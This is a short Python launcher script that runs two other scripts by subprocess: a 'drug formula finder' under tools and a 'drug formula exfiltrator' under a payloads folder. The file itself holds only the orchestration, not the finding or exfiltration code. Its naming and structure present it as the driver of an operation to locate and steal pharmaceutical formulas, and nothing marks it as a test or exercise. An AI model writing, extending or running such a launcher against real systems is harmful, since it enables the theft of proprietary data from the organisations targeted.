import subprocess
import os

def main():
    # Run the drug formula finder
    finder_path = os.path.join(os.path.dirname(__file__), "tools", "drug_formula_finder.py")
    subprocess.run(["python3", finder_path])

    # Run the drug formula exfiltrator
    exfiltrator_path = os.path.join(os.path.dirname(__file__), "payloads", "drug_formula_exfiltrator.py")
    subprocess.run(["python3", exfiltrator_path])

if __name__ == "__main__":
    main()
